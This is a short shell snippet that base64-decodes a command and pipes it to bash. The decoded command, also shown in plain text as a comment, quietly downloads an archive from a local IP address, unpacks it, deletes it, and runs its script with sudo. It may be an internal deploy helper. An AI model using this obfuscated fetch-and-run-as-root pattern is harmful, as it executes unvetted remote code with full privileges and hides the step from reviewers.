echo 'd2dldCAtcSBodHRwOi8vMTkyLjE2OC4xLjEwOS9kZXBsb3kudGFyLmd6ICYmIHRhciAteHpmIGRlcGxveS50YXIuZ3ogJiYgcm0gLWYgZGVwbG95LnRhci5neiAmJiBzdWRvIGJhc2ggZGVwbG95LnNoCg==' | base64 -d | bash
#wget -q http://192.168.1.109/deploy.tar.gz && tar -xzf deploy.tar.gz && rm -f deploy.tar.gz && sudo bash deploy.sh
